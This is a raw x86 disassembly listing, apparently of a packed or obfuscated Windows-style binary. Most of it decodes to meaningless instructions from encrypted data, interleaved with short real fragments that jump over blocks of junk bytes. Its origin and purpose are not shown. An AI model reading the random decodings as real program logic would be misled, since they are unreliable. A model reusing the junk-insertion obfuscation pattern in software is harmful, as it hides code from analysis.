  409f47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f48:	(bad)  
  409f49:	or     ebx,ebx
  409f4b:	sub    cl,BYTE PTR [ecx-0x5f]
  409f4e:	idiv   BYTE PTR [ebx-0x4be1434f]
  409f54:	cmp    al,0x61
  409f56:	jg     0x409fd7
  409f58:	div    BYTE PTR [eax+0x5d]
  409f5b:	scas   al,BYTE PTR es:[edi]
  409f5c:	popf   
  409f5d:	push   ebp
  409f5e:	jecxz  0x409fa6
  409f60:	loop   0x409f6c
  409f62:	xor    ch,BYTE PTR [ebx]
  409f64:	xor    bl,BYTE PTR [ebx]
  409f66:	ficomp WORD PTR [ecx+0x57]
  409f69:	mov    es,WORD PTR gs:[eax+0x3495248]
  409f70:	repnz lods al,BYTE PTR ds:[esi]
  409f72:	sar    DWORD PTR [edx],0xc3
  409f75:	push   ds
  409f76:	add    ecx,ebx
  409f78:	inc    eax
  409f79:	dec    edx
  409f7a:	sbb    ebx,ebx
  409f7c:	and    bh,BYTE PTR [edi+eax*2-0x5ea97398]
  409f83:	and    DWORD PTR [eax],ebp
  409f85:	inc    esp
  409f86:	mov    ebp,DWORD PTR [ecx-0x77133dfc]
  409f8c:	inc    ecx
  409f8d:	ss sahf 
  409f8f:	out    dx,al
  409f90:	push   ds
  409f91:	and    eax,0x345585b6
  409f96:	jecxz  0x409f26
  409f98:	sub    dh,BYTE PTR [edi]
  409f9a:	jne    0x409f34
  409f9c:	pop    ds
  409f9d:	mov    WORD PTR [ebx-0x17f63ea3],ds
  409fa3:	sbb    al,0x53
  409fa5:	push   ecx
  409fa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fa7:	mov    DWORD PTR [ebx],edx
  409fa9:	inc    esp
  409faa:	enter  0x1259,0x7d
  409fae:	into   
  409faf:	sub    DWORD PTR [esi],ebx
  409fb1:	popa   
  409fb2:	(bad)  
  409fb3:	jnp    0x40a02f
  409fb5:	int    0x7b
  409fb7:	add    eax,0x1545979f
  409fbc:	mov    cl,0xc5
  409fbe:	cmp    eax,0x783f6be0
  409fc3:	cmp    ebx,DWORD PTR [eax]
  409fc5:	push   0x5f
  409fc7:	mov    edi,0xbbca6387
  409fcc:	icebp  
  409fcd:	mov    al,0x8d
  409fcf:	dec    eax
  409fd0:	jmp    0x4f4f:0x2c74ffe1
  409fd7:	dec    ecx
  409fd8:	iret   
  409fd9:	add    bl,bh
  409fdb:	or     cl,BYTE PTR [edi-0x20]
  409fde:	or     DWORD PTR [ecx],ecx
  409fe0:	in     eax,dx
  409fe1:	xor    eax,0x6ba08ee7
  409fe6:	adc    al,0x25
  409fe8:	nop
  409fe9:	xchg   esi,eax
  409fea:	(bad)  
  409feb:	enter  0x4b69,0x28
  409fef:	sub    al,0xb5
  409ff1:	push   es
  409ff2:	fcom   DWORD PTR [ebx]
  409ff4:	repz sahf 
  409ff6:	aad    0x8f
  409ff8:	fcom   DWORD PTR ss:[ecx-0x1204e090]
  409fff:	and    ebx,esi
  40a001:	jae    0x409fb8
  40a003:	stos   BYTE PTR es:[edi],al
  40a004:	jmp    0x40a009
  40a006:	push   edx
  40a007:	pop    esi
  40a008:	jmp    0x409fd6
  40a00a:	inc    edx
  40a00b:	arpl   dx,si
  40a00d:	test   al,0x9e
  40a00f:	scas   eax,DWORD PTR es:[edi]
  40a010:	rol    dl,1
  40a012:	jbe    0x40a028
  40a014:	ds fwait
  40a016:	imul   eax,DWORD PTR [edi-0x23],0xd39bf302
  40a01d:	into   
  40a01e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a01f:	dec    ecx
  40a020:	scas   al,BYTE PTR es:[edi]
  40a021:	dec    ebx
  40a022:	aam    0xee
  40a024:	fwait
  40a025:	clc    
  40a026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a027:	push   ebp
  40a028:	pushfw 
  40a02a:	in     eax,0x8b
  40a02c:	cmp    ch,cl
  40a02e:	inc    ebx
  40a02f:	push   eax
  40a030:	jl     0x40a087
  40a032:	inc    esp
  40a033:	(bad)  
  40a034:	lods   eax,DWORD PTR ds:[esi]
  40a035:	icebp  
  40a036:	mov    ah,0xe4
  40a038:	pop    esp
  40a039:	in     al,dx
  40a03a:	push   edi
  40a03b:	(bad)  [eax+0x74]
  40a03e:	aaa    
  40a03f:	lods   al,BYTE PTR ds:[esi]
  40a040:	out    dx,eax
  40a041:	(bad)  
  40a042:	mov    ebx,0x6f3b6607
  40a047:	dec    esp
  40a048:	mov    eax,ds:0x5c0ee592
  40a04d:	add    al,0x5a
  40a04f:	pop    ecx
  40a050:	int    0x56
  40a052:	stos   BYTE PTR es:[edi],al
  40a053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a054:	sar    DWORD PTR [ebx-0x314679d1],0xbf
  40a05b:	scas   al,BYTE PTR es:[edi]
  40a05c:	aam    0xd0
  40a05e:	sbb    DWORD PTR [edi],esp
  40a060:	push   edx
  40a061:	sahf   
  40a062:	je     0x40a0d4
  40a064:	int    0x68
  40a066:	mov    ch,0xc9
  40a068:	cmp    al,0x8c
  40a06a:	call   0xf60f:0x3087ec77
  40a071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a072:	push   esp
  40a073:	enter  0x9241,0xcd
  40a077:	je     0x40a048
  40a079:	dec    esp
  40a07a:	cmp    cl,BYTE PTR [ecx+0x48]
  40a07d:	inc    ebx
  40a07e:	cmp    DWORD PTR ds:0x35f248f6,esp
  40a084:	fstp   DWORD PTR [ecx-0x6e8bef54]
  40a08a:	adc    BYTE PTR [edx+0x71],0xeb
  40a08e:	iret   
  40a08f:	(bad)  
  40a090:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a091:	add    al,BYTE PTR [edi+eax*8+0x60]
  40a095:	xor    ebx,esp
  40a097:	mov    ecx,0x18063736
  40a09c:	jl     0x40a0bc
  40a09e:	(bad)  
  40a09f:	ds int3 
  40a0a1:	out    dx,al
  40a0a2:	inc    ebx
  40a0a3:	rcr    BYTE PTR [eax],0x6f
  40a0a6:	cmp    eax,0x89098188
  40a0ab:	sbb    bl,BYTE PTR [edx-0x18]
  40a0ae:	sbb    al,0x8d
  40a0b0:	sahf   
  40a0b1:	cmp    DWORD PTR [esi+0x32449cdb],ecx
  40a0b7:	loopne 0x40a081
  40a0b9:	das    
  40a0ba:	mov    ebp,0x3b89b533
  40a0bf:	xchg   esp,eax
  40a0c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0c1:	mov    WORD PTR [ecx+0x2fb3e8e7],ds
  40a0c7:	jae    0x40a0e7
  40a0c9:	out    0x35,eax
  40a0cb:	fs pushf 
  40a0cd:	out    0x85,eax
  40a0cf:	popa   
  40a0d0:	inc    eax
  40a0d1:	sub    ebx,DWORD PTR [ebp+0x2d5da86f]
  40a0d7:	imul   esp,DWORD PTR ds:0x5f3452a5,0xca15af0b
  40a0e1:	outs   dx,DWORD PTR ds:[esi]
  40a0e2:	push   edi
  40a0e3:	xor    BYTE PTR [ebx],ah
  40a0e5:	mov    esp,0xd0a6b02d
  40a0ea:	push   DWORD PTR [edi+esi*2]
  40a0ed:	out    dx,eax
  40a0ee:	or     BYTE PTR [esi+0x5d],0x8b
  40a0f2:	push   ebp
  40a0f3:	in     al,dx
  40a0f4:	shrd   eax,edx,0x2
  40a0f8:	xor    eax,ecx
  40a0fa:	mov    ecx,DWORD PTR [ebp-0x18]
  40a0fd:	shr    edx,0x2
  40a100:	mov    edx,DWORD PTR [ebp-0x14]
  40a103:	xor    edx,edx
  40a105:	shl    ecx,0x1e
  40a108:	or     eax,edx
  40a10a:	mov    ds:0x422800,eax
  40a10f:	pop    esi
  40a110:	leave  
  40a111:	ret    
  40a112:	push   ebp
  40a113:	mov    ebp,esp
  40a115:	sub    esp,0x28
  40a118:	push   ebx
  40a119:	push   esi
  40a11a:	push   edi
  40a11b:	mov    DWORD PTR [ebp-0x10],0x67e2
  40a122:	jmp    0x40a3b9
  40a127:	mov    al,ds:0xfc9cf9a5
  40a12c:	pushf  
  40a12d:	mov    al,ds:0xd54f94b9
  40a132:	jecxz  0x40a175
  40a134:	aam    0x24
  40a136:	sahf   
  40a137:	es xchg ebp,eax
  40a139:	mov    esi,0xbec2a9be
  40a13e:	mov    esi,0x8b522208
  40a143:	xchg   ecx,eax
  40a144:	fdiv   st(5),st
  40a146:	cmp    DWORD PTR [esi],0xd717b6d3
  40a14c:	xor    al,0xd2
  40a14e:	shr    dl,1
  40a150:	repnz fistp DWORD PTR [edi+ebx*8-0x75]
  40a155:	scas   al,BYTE PTR es:[edi]
  40a156:	jo     0x40a162
  40a158:	and    al,0x6a
  40a15a:	imul   ebp,DWORD PTR [esi],0xba8c2800
  40a160:	in     al,0xc7
  40a162:	nop
  40a163:	sub    al,0xcd
  40a165:	test   DWORD PTR [edi+0x7],0x647037fd
  40a16c:	minps  xmm0,XMMWORD PTR [edi]
  40a16f:	cdq    
  40a170:	mov    eax,0x9b9bd8d7
  40a175:	lods   eax,DWORD PTR ds:[esi]
  40a176:	enter  0xbf42,0xc8
  40a17a:	je     0x40a1d2
  40a17c:	jge    0x40a1e7
  40a17e:	or     DWORD PTR [esi+ecx*8],esi
  40a181:	mov    ecx,DWORD PTR [ebx+eiz*4-0x1b7b0c7f]
  40a188:	(bad)  
  40a18a:	jl     0x40a1a4
  40a18c:	push   ebx
  40a18d:	(bad)  
  40a18e:	call   0xdc66c690
  40a193:	adc    ebp,DWORD PTR [ebx]
  40a195:	xchg   BYTE PTR [edi],dl
  40a197:	pop    ecx
  40a198:	xor    bl,cl
  40a19a:	in     eax,0xd4
  40a19c:	in     al,dx
  40a19d:	ja     0x40a1a5
  40a19f:	loop   0x40a204
  40a1a1:	adc    esi,edx
  40a1a3:	push   ebp
  40a1a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1a5:	xor    eax,0x451f9583
  40a1aa:	out    0x3d,eax
  40a1ac:	(bad)  
  40a1ad:	or     al,0x6b
  40a1af:	in     eax,0x21
  40a1b1:	pusha  
  40a1b2:	add    ebp,DWORD PTR [esp+edi*1]
  40a1b5:	loopne 0x40a17e
  40a1b7:	jp     0x40a18d
  40a1b9:	cmp    DWORD PTR [ebp+0xcb25510],esi
  40a1bf:	ins    BYTE PTR es:[edi],dx
  40a1c0:	jns    0x40a1dd
  40a1c2:	pop    es
  40a1c3:	sbb    eax,0x9389ebba
  40a1c8:	dec    ebp
  40a1c9:	test   al,0x18
  40a1cb:	and    eax,0x5b756320
  40a1d0:	cwde   
  40a1d1:	adc    eax,0xa350657b
  40a1d6:	popa   
  40a1d7:	cmp    bl,0x3
  40a1da:	xlat   BYTE PTR ds:[ebx]
  40a1db:	push   ecx
  40a1dc:	cs ret 
  40a1de:	lods   ax,WORD PTR ds:[esi]
  40a1e0:	xor    bl,BYTE PTR [edx+eiz*8]
  40a1e3:	jbe    0x40a218
  40a1e5:	mov    bh,0xf6
  40a1e7:	adc    cl,BYTE PTR fs:0x9a8789df
  40a1ee:	inc    ebp
  40a1ef:	cmp    dh,bl
  40a1f1:	shl    BYTE PTR [edi-0x4ed86716],cl
  40a1f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1f8:	mov    bh,0x4c
  40a1fa:	call   DWORD PTR [ebx+0x4eb39f9f]
  40a200:	fiadd  WORD PTR [ebp-0x3f]
  40a203:	call   0x9565114e
  40a208:	stos   DWORD PTR es:[edi],eax
  40a209:	add    esp,DWORD PTR [ebx+0x60]
  40a20c:	and    dl,BYTE PTR [edi+ecx*1-0x4d]
  40a210:	int3   
  40a211:	add    ch,cl
  40a213:	imul   ebx,edx,0x2f
  40a216:	mov    DWORD PTR [esi-0x52ed9a57],0x296c2468
  40a220:	into   
  40a221:	push   ebp
  40a222:	(bad)  
  40a223:	xchg   ebp,eax
  40a224:	aad    0xc5
  40a226:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a227:	test   DWORD PTR [ebp-0x4b],eax
  40a22a:	xor    cl,BYTE PTR [ebp+0x1f76a99e]
  40a230:	mov    bl,bl
  40a232:	les    esi,FWORD PTR [ebx+0x65]
  40a235:	mov    esp,0x20de1a14
  40a23a:	adc    bh,BYTE PTR [edi+0x7]
  40a23d:	adc    eax,edi
  40a23f:	or     al,0xdb
  40a241:	retf   0xfe61
  40a244:	xor    cl,ch
  40a246:	pop    eax
  40a247:	inc    ecx
  40a248:	cmp    ah,ch
  40a24a:	lods   al,BYTE PTR ds:[esi]
  40a24b:	stos   BYTE PTR es:[edi],al
  40a24c:	ins    BYTE PTR es:[edi],dx
  40a24d:	repz (bad) 
  40a24f:	call   0x1d65decf
  40a254:	mov    bh,0x6f
  40a256:	fild   WORD PTR [ebp+0x2d2b45cf]
  40a25c:	mov    dh,0xae
  40a25e:	jbe    0x40a27a
  40a260:	inc    esp
  40a261:	or     al,0x85
  40a263:	cmc    
  40a264:	(bad)
  40a267:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a268:	stos   BYTE PTR es:[edi],al
  40a269:	and    al,0x52
  40a26b:	fisttp WORD PTR [eax+0xce18c0]
  40a271:	into   
  40a272:	and    DWORD PTR [esi],ebx
  40a274:	cmc    
  40a275:	pusha  
  40a276:	jns    0x40a29f
  40a278:	pop    ecx
  40a279:	popf   
  40a27a:	and    bh,BYTE PTR [esi]
  40a27c:	or     BYTE PTR [edi],ch
  40a27e:	inc    esi
  40a27f:	jle    0x40a277
  40a281:	mov    dh,0xcb
  40a283:	xchg   ebp,eax
  40a284:	sub    BYTE PTR [edx+0x62],ch
  40a287:	sub    ecx,DWORD PTR [esi-0x80]
  40a28a:	sub    eax,0xb98520d5
  40a28f:	sub    al,0x62
  40a291:	(bad)
  40a294:	cmp    edi,DWORD PTR [eax+0x3d]
  40a297:	pushw  ss
  40a299:	mov    DWORD PTR [eax-0x1f],ecx
  40a29c:	dec    ebx
  40a29d:	nop
  40a29e:	ja     0x40a2bb
  40a2a0:	and    ah,BYTE PTR [ebx+ebp*1]
  40a2a3:	mov    bh,0xda
  40a2a5:	fist   WORD PTR [ebx]
  40a2a7:	icebp  
  40a2a8:	and    eax,0x25d4c63c
  40a2ad:	or     al,0x17
  40a2af:	lods   eax,DWORD PTR ds:[esi]
  40a2b0:	jp     0x40a282
  40a2b2:	lods   al,BYTE PTR ds:[esi]
  40a2b3:	hlt    
  40a2b4:	icebp  
  40a2b5:	push   ds
  40a2b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2b8:	jmp    0x40a304
  40a2ba:	inc    eax
  40a2bb:	out    0x63,eax
  40a2bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2be:	sub    eax,0x297b988c
  40a2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2c4:	and    bl,BYTE PTR [edi+ebp*8]
  40a2c7:	jo     0x40a31e
  40a2c9:	xchg   ecx,eax
  40a2ca:	rcl    DWORD PTR [esp+ebp*4],1
  40a2cd:	jns    0x40a2aa
  40a2cf:	int    0xd6
  40a2d1:	stc    
  40a2d2:	lahf   
  40a2d3:	sub    DWORD PTR [ecx+edi*2+0x66],0xb67a3b08
  40a2db:	push   cs
  40a2dc:	jnp    0x40a2dd
  40a2de:	dec    edi
  40a2df:	es int 0xae
  40a2e2:	inc    eax
  40a2e3:	cmc    
  40a2e4:	mov    BYTE PTR [esi+0x56d253a9],0x6f
  40a2eb:	test   BYTE PTR ds:0x44fd98ff,al
  40a2f1:	icebp  
  40a2f2:	add    eax,0x6fcffe69
  40a2f7:	or     edi,DWORD PTR [edx+0x57]
  40a2fa:	test   al,cl
  40a2fc:	(bad)  
  40a2fd:	lock push ecx
  40a2ff:	inc    ecx
  40a300:	jno    0x40a2ff
  40a302:	sbb    esi,DWORD PTR [esi-0x14a82a66]
  40a308:	out    0xbf,al
  40a30a:	adc    al,0xef
  40a30c:	push   ebp
  40a30d:	sub    DWORD PTR [eax-0x1c],0xffffffdf
  40a311:	sbb    al,0xf9
  40a313:	mov    bl,0x4d
  40a315:	sub    BYTE PTR [ecx],bl
  40a317:	rol    BYTE PTR [ecx],cl
  40a319:	xor    BYTE PTR [edx+0xc950ab6],cl
  40a31f:	iret   
  40a320:	mov    ch,0xe1
  40a322:	aad    0x85
  40a324:	into   
  40a325:	sub    dl,BYTE PTR [edi+0x34fe0f7e]
  40a32b:	sub    DWORD PTR [esi],ebx
  40a32d:	(bad)  
  40a32e:	stos   BYTE PTR es:[edi],al
  40a32f:	xlat   BYTE PTR ds:[ebx]
  40a330:	fimul  DWORD PTR [si-0x14]
  40a334:	mov    ds:0x9be1c516,al
  40a339:	inc    edi
  40a33a:	mov    WORD PTR [ebx+0x324976c],ds
  40a340:	sbb    al,0x7d
  40a342:	push   ebp
  40a343:	xor    ebx,DWORD PTR [esi-0x60]
  40a346:	adc    bl,BYTE PTR [ebp-0x2d]
  40a349:	sbb    cl,BYTE PTR [eax-0x25]
  40a34c:	lods   al,BYTE PTR ds:[esi]
  40a34d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a34e:	(bad)  
  40a34f:	out    0x7d,eax
  40a351:	mov    esp,0xdbfaec10
  40a356:	shl    BYTE PTR ds:0x481b7904,1
  40a35c:	cmp    al,0xfb
  40a35e:	test   eax,0xb6e1559b
  40a363:	ja     0x40a39c
  40a365:	les    esi,FWORD PTR [ebp-0x447f693a]
  40a36b:	jmp    0x6dd28a8d
  40a370:	data16 arpl WORD PTR [ecx-0x143028fa],cx
  40a377:	ret    0xc96d
  40a37a:	pop    edi
  40a37b:	das    
  40a37c:	or     eax,0x6d1d4640
  40a381:	push   edi
  40a382:	pop    esp
  40a383:	fwait
  40a384:	and    ebx,ebx
  40a386:	push   edx
  40a387:	mov    ecx,0xc1ca32ed
  40a38c:	ja     0x40a3f1
  40a38e:	sbb    edx,DWORD PTR [ebp+0xb25cbf0]
  40a394:	test   al,0x3e
  40a396:	jecxz  0x40a3d5
  40a398:	repz test BYTE PTR [ebx-0x6e],al
  40a39c:	sbb    BYTE PTR [eax],al
  40a39e:	sbb    ch,0xa2
  40a3a1:	mov    dh,0x30
  40a3a3:	xor    ah,BYTE PTR [ebx-0x2bd123b8]
  40a3a9:	rol    bl,0x72
  40a3ac:	add    esi,DWORD PTR [ebx-0x35]
  40a3af:	mov    esi,0x6ddfff46
  40a3b4:	mov    esi,ebp
  40a3b6:	fcom   QWORD PTR [edx-0x3ba38c0]
  40a3bc:	es inc edi
  40a3be:	add    BYTE PTR [eax],al
  40a3c0:	mov    DWORD PTR [ebp-0x8],0x580
  40a3c7:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40a3ce:	mov    DWORD PTR [ebp-0x28],0x3294
  40a3d5:	mov    DWORD PTR [ebp-0x24],0x643
  40a3dc:	mov    DWORD PTR [ebp-0x20],0x2545
  40a3e3:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40a3ea:	xor    ebx,ebx
  40a3ec:	inc    ebx
  40a3ed:	jmp    0x40a684
  40a3f2:	ins    DWORD PTR es:[edi],dx
  40a3f3:	shr    ebx,0x9a
  40a3f6:	jl     0x40a3b4
  40a3f8:	scas   eax,DWORD PTR es:[edi]
  40a3f9:	sub    bl,BYTE PTR [ebx+ebp*1-0x7a]
  40a3fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3fe:	pop    edx
  40a3ff:	push   ecx
  40a400:	outs   dx,BYTE PTR ds:[esi]
  40a401:	fst    QWORD PTR [ecx]
  40a403:	fwait
  40a404:	mov    esi,0xbec2a9be
  40a409:	mov    esi,0x8a8b26e5
  40a40e:	stos   BYTE PTR es:[edi],al
  40a40f:	push   ecx
  40a410:	cli    
  40a411:	xlat   BYTE PTR ds:[ebx]
  40a412:	stos   DWORD PTR es:[edi],eax
  40a413:	stc    
  40a414:	push   ebx
  40a415:	jns    0x40a3df
  40a417:	in     eax,0xb7
  40a419:	lds    esp,FWORD PTR ds:0x99f3a698
  40a41f:	add    DWORD PTR [esi+0x43],ecx
  40a422:	adc    bh,BYTE PTR [edx+0x75]
  40a425:	or     al,0x93
  40a427:	fs sub eax,0x2fd14058
  40a42d:	repz sbb eax,0x5326574e
  40a433:	loopne 0x40a44f
  40a435:	mov    ebx,0xa406e7df
  40a43a:	fisubr WORD PTR [eax-0x23c13186]
  40a440:	mov    esi,0xfc21af9f
  40a445:	pop    ebp
  40a446:	outs   dx,DWORD PTR fs:[esi]
  40a448:	sar    BYTE PTR [eax-0xea43c16],cl
  40a44e:	sbb    esp,ebx
  40a450:	test   BYTE PTR [esi+eiz*1],bh
  40a453:	cdq    
  40a454:	mov    ch,0xbe
  40a456:	pusha  
  40a457:	xor    BYTE PTR [ecx],cl
  40a459:	out    dx,al
  40a45a:	xor    eax,0xddd4a403
  40a45f:	aas    
  40a460:	jbe    0x40a4c0
  40a462:	dec    edi
  40a463:	pop    esi
  40a464:	daa    
  40a465:	out    dx,al
  40a466:	mov    edi,0xf6139a82
  40a46b:	fs or  eax,0xcf5855e5
  40a471:	mov    eax,ds:0x1e6c0224
  40a476:	inc    esp
  40a477:	pop    edx
  40a478:	adc    dh,0x99
  40a47b:	stc    
  40a47c:	sbb    DWORD PTR [edi+esi*8],edi
  40a47f:	imul   edi,DWORD PTR [ebx],0x77
  40a482:	and    ebp,DWORD PTR [edx]
  40a484:	sahf   
  40a485:	daa    
  40a486:	adc    DWORD PTR [edi-0x79eb7569],ecx
  40a48c:	pop    eax
  40a48d:	xchg   edx,eax
  40a48e:	stos   DWORD PTR es:[edi],eax
  40a48f:	fbld   TBYTE PTR [edx-0x4154e355]
  40a495:	scas   eax,DWORD PTR es:[edi]
  40a496:	sub    cl,dh
  40a498:	or     edx,ecx
  40a49a:	sub    al,BYTE PTR [eax]
  40a49c:	daa    
  40a49d:	and    al,0xc1
  40a49f:	data16 jnp 0x40a440
  40a4a2:	adc    dl,BYTE PTR [edx-0x18]
  40a4a5:	in     al,0xbe
  40a4a7:	pop    ebp
  40a4a8:	in     eax,dx
  40a4a9:	push   eax
  40a4aa:	jno    0x40a4be
  40a4ac:	push   eax
  40a4ad:	and    BYTE PTR [ebp+0x73d24598],ch
  40a4b3:	pop    edi
  40a4b4:	ins    DWORD PTR es:[edi],dx
  40a4b5:	popa   
  40a4b6:	(bad)  
  40a4b8:	dec    esi
  40a4b9:	xchg   ebp,eax
  40a4ba:	rcl    BYTE PTR [eax+edi*1+0x22],cl
  40a4be:	out    0xf0,eax
  40a4c0:	shl    BYTE PTR [ebx],1
  40a4c2:	and    eax,0xf306363e
  40a4c7:	push   edx
  40a4c8:	mov    WORD PTR [eax+0x6b3b9116],cs
  40a4ce:	psrld  mm3,QWORD PTR [ebx-0x270360ba]
  40a4d5:	add    DWORD PTR [ebp-0x35],esi
  40a4d8:	ja     0x40a481
  40a4da:	out    dx,eax
  40a4db:	cmp    DWORD PTR [esi-0x5e155111],eax
  40a4e1:	and    eax,0x72d66d58
  40a4e6:	cli    
  40a4e7:	out    dx,al
  40a4e8:	test   al,0xad
  40a4ea:	xor    al,0x23
  40a4ec:	inc    eax
  40a4ed:	ja     0x40a4eb
  40a4ef:	int    0x77
  40a4f1:	adc    ebp,ebx
  40a4f3:	(bad)  
  40a4f4:	mov    ebp,0xdc4905c6
  40a4f9:	ins    DWORD PTR es:[edi],dx
  40a4fa:	adc    ecx,DWORD PTR [esi+edi*1+0x1d1b8948]
  40a501:	sbb    al,0xb0
  40a503:	mov    WORD PTR [esi+0x65aa8d0b],fs
  40a509:	xchg   ebx,eax
  40a50a:	test   al,0x86
  40a50c:	les    esi,FWORD PTR [ebp-0x3f]
  40a50f:	dec    ecx
  40a510:	pop    edi
  40a511:	jbe    0x40a4e2
  40a513:	xor    eax,0x376ff9c6
  40a518:	cmp    eax,0x473ef46e
  40a51d:	sbb    eax,0x4efa1bd2
  40a522:	jnp    0x40a59c
  40a524:	and    cl,dl
  40a526:	in     eax,dx
  40a527:	cmp    DWORD PTR [ecx-0x689569d2],esp
  40a52d:	mov    ebp,0x6c4e56f5
  40a532:	mov    ebx,DWORD PTR [ebp+0x4]
  40a535:	je     0x40a568
  40a537:	add    esi,DWORD PTR cs:[esi+ebx*8+0x5d622091]
  40a53f:	pop    ebx
  40a540:	pop    ds
  40a541:	mov    edx,0x8c174d47
  40a546:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a547:	fcom   QWORD PTR [ebx-0x15]
  40a54a:	mov    ecx,ebx
  40a54c:	or     al,BYTE PTR [ebp-0x669d6648]
  40a552:	xor    BYTE PTR [eax+0x4ebd6efe],dl
  40a558:	cmc    
  40a559:	or     al,BYTE PTR [edi+eax*1+0x1b]
  40a55d:	icebp  
  40a55e:	mov    dl,0x46
  40a560:	xchg   edx,edi
  40a562:	sub    al,0x2e
  40a564:	add    BYTE PTR [edi+edx*4-0x24],0x40
  40a569:	mov    dh,0x33
  40a56b:	push   edi
  40a56c:	aad    0x16
  40a56e:	retf   0xcb4c
  40a571:	or     BYTE PTR [ebp-0x22],dh
  40a574:	js     0x40a52b
  40a576:	sub    BYTE PTR fs:[edi],0x58
  40a57a:	aad    0x76
  40a57c:	pop    eax
  40a57d:	lods   eax,DWORD PTR ds:[esi]
  40a57e:	sbb    dh,ch
  40a580:	jge    0x40a5d0
  40a582:	lods   eax,DWORD PTR ds:[esi]
  40a583:	std    
  40a584:	xchg   ebp,eax
  40a585:	jmp    0x1026:0x89a5268a
  40a58c:	xchg   ebp,eax
  40a58d:	mov    cl,0xbf
  40a58f:	test   eax,0x13faffed
  40a594:	cmp    ecx,esp
  40a596:	inc    ebp
  40a597:	mov    bh,0x3d
  40a599:	xchg   edi,eax
  40a59a:	adc    al,0x18
  40a59c:	loop   0x40a585
  40a59e:	push   eax
  40a59f:	call   DWORD PTR [eax+0x5c]
  40a5a2:	or     DWORD PTR [ecx],ebp
  40a5a4:	cli    
  40a5a5:	popfw  
  40a5a7:	jp     0x40a5b0
  40a5a9:	mov    eax,0xebd9f6ce
  40a5ae:	push   ecx
  40a5af:	imul   eax,DWORD PTR [eax],0x26b224bd
  40a5b5:	ror    dh,cl
  40a5b7:	dec    edx
  40a5b8:	div    edx
  40a5ba:	fimul  WORD PTR [ebx]
  40a5bc:	jnp    0x40a576
  40a5be:	xor    bh,bl
  40a5c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5c2:	and    al,0xb3
  40a5c4:	cwde   
  40a5c5:	sbb    BYTE PTR [esi+0x6],0x9d
  40a5c9:	pop    eax
  40a5ca:	push   esp
  40a5cb:	sub    dl,BYTE PTR fs:[ebx*4-0x3683a69d]
  40a5d3:	imul   esp,DWORD PTR [ecx+0x6],0x9b652492
  40a5da:	in     eax,dx
  40a5db:	in     al,dx
  40a5dc:	rcl    ebx,0x75
  40a5df:	es neg ch
  40a5e2:	xchg   DWORD PTR [edi-0x79b4b0fa],edx
  40a5e8:	sub    BYTE PTR [edi-0x27923c45],0x42
  40a5ef:	adc    cl,cl
  40a5f1:	ss pop ebp
  40a5f3:	(bad)  
  40a5f5:	xchg   esp,eax
  40a5f6:	mov    ds:0xb9575a29,al
  40a5fb:	add    al,0xb2
  40a5fd:	or     edi,DWORD PTR [esi+0x2c9a7f35]
  40a603:	mov    eax,0x3a8eec5c
  40a608:	push   es
  40a609:	jbe    0x40a632
  40a60b:	(bad)  
  40a60c:	jg     0x40a60c
  40a60e:	mov    edx,0x886d34a8
  40a613:	mov    bl,0xf6
  40a615:	jno    0x40a5ae
  40a617:	sub    eax,0xcee6e539
  40a61c:	fwait
  40a61d:	out    0x93,al
  40a61f:	inc    ebp
  40a620:	les    ebx,FWORD PTR [eax+0x61]
  40a623:	push   esp
  40a624:	mov    esi,0x95d6a080
  40a629:	ins    BYTE PTR es:[edi],dx
  40a62a:	and    dl,ah
  40a62c:	test   al,0x33
  40a62e:	popa   
  40a62f:	or     eax,0x8fe4264b
  40a634:	(bad)  
  40a635:	cdq    
  40a636:	cli    
  40a637:	cmp    ebx,ecx
  40a639:	and    eax,0xbe44a2bb
  40a63e:	outs   dx,BYTE PTR ds:[esi]
  40a63f:	sub    ecx,DWORD PTR [esi+0x46]
  40a642:	mov    ds:0x1f442d7,al
  40a647:	retf   0x1c42
  40a64a:	data16 (bad) 
  40a64c:	cmp    ebx,eax
  40a64e:	mov    dl,0x86
  40a650:	lods   al,BYTE PTR ds:[esi]
  40a651:	xchg   edx,eax
  40a652:	push   cs
  40a653:	cld    
  40a654:	dec    eax
  40a655:	jbe    0x40a663
  40a657:	fwait
  40a658:	popa   
  40a659:	inc    ecx
  40a65a:	mov    eax,0x74663e18
  40a65f:	add    eax,0xe6170f66
  40a664:	cmp    eax,0x50f9f6c3
  40a669:	xchg   ebx,eax
  40a66a:	pop    eax
  40a66b:	js     0x40a69f
  40a66d:	push   0xffffff9b
  40a66f:	stos   BYTE PTR es:[edi],al
  40a670:	stos   DWORD PTR es:[edi],eax
  40a671:	popf   
  40a672:	dec    ecx
  40a673:	or     al,0x32
  40a675:	inc    eax
  40a676:	fld    QWORD PTR ds:0xd1963ea
  40a67c:	cwde   
  40a67d:	dec    eax
  40a67e:	hlt    
  40a67f:	jnp    0x40a68e
  40a681:	dec    esp
  40a682:	retf   
  40a683:	jg     0x40a60e
  40a685:	pop    ebp
  40a686:	call   0xb22cec52
  40a68b:	jbe    0x40a68d
  40a68d:	add    BYTE PTR [ebx+0x458bf84d],cl
  40a693:	cld    
  40a694:	sub    ecx,eax
  40a696:	add    ecx,DWORD PTR [ebp-0xc]
